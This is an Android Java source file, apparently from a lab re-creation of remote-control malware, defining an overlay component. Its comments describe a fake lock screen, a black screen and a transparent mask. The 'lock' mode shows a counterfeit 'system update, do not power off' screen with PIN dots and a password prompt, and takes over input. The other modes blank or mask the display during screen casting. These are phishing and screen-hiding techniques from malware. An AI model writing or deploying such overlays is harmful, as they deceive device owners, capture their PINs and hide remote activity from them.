package com.ref.labagent;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * 悬浮窗：假锁屏（原版 showLockOverlay / admLock / admPwd）、黑屏（black/blackB）、
 * 全透明遮罩（transparent）、投屏时的可点图层（openLayer / requestfloaty）。
 *
 * 这些是**必须 SYSTEM_ALERT_WINDOW 权限的 App 组件**才能画的，root 也替不了。
 */
public class Overlay {

    private static View cur;
    private static WindowManager wm;

    public static boolean canDraw(Context c) {
        if (Build.VERSION.SDK_INT >= 23) {
            return Settings.canDrawOverlays(c);
        }
        return true;
    }

    public static void requestPermission(Context c) {
        if (Build.VERSION.SDK_INT < 23 || canDraw(c)) {
            return;
        }
        Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + c.getPackageName()));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            c.startActivity(i);
        } catch (Throwable ignored) {
        }
    }

    public static synchronized String show(Activity host, String type, String title,
                                           String disclaimer, int pinLen) {
        Context c = host == null ? Bridge.app() : host;
        if (c == null) {
            return "no-context";
        }
        if (!canDraw(c)) {
            requestPermission(c);
            return "no-permission";
        }
        try {
            close();
            wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
            LinearLayout root = new LinearLayout(c);
            root.setOrientation(LinearLayout.VERTICAL);
            root.setGravity(Gravity.CENTER);

            if ("lock".equals(type)) {
                root.setBackgroundColor(Color.parseColor("#0B0F1A"));
                root.addView(tv(c, "🔄 " + (title == null || title.isEmpty() ? "系统更新" : title), 22, Color.WHITE));
                root.addView(tv(c, disclaimer == null || disclaimer.isEmpty()
                        ? "正在安装系统更新，请勿关机" : disclaimer, 14, Color.parseColor("#9AA4B2")));
                StringBuilder dots = new StringBuilder();
                for (int i = 0; i < (pinLen <= 0 ? 6 : pinLen); i++) {
                    dots.append("○ ");
                }
                root.addView(tv(c, dots.toString(), 28, Color.WHITE));
                root.addView(tv(c, "输入密码以继续", 12, Color.parseColor("#6B7280")));
            } else if ("transparent".equals(type)) {
                root.setBackgroundColor(Color.parseColor("#01000000"));
            } else {
                root.setBackgroundColor(Color.BLACK);           // black / blackB
            }

            int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
            if ("lock".equals(type)) {
                flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;   // 假锁屏要能吃掉输入
            }
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= 26
                            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                            : WindowManager.LayoutParams.TYPE_PHONE,
                    flags, PixelFormat.TRANSLUCENT);
            lp.gravity = Gravity.TOP | Gravity.LEFT;
            wm.addView(root, lp);
            cur = root;
            return "ok";
        } catch (Throwable t) {
            return "err:" + t;
        }
    }

    public static synchronized String close() {
        try {
            if (cur != null && wm != null) {
                wm.removeView(cur);
            }
        } catch (Throwable ignored) {
        }
        cur = null;
        return "ok";
    }

    public static boolean isShowing() {
        return cur != null;
    }

    private static TextView tv(Context c, String s, int size, int color) {
        TextView t = new TextView(c);
        t.setText(s);
        t.setTextSize(size);
        t.setTextColor(color);
        t.setGravity(Gravity.CENTER);
        t.setTypeface(Typeface.DEFAULT_BOLD);
        t.setPadding(0, 24, 0, 24);
        return t;
    }
}
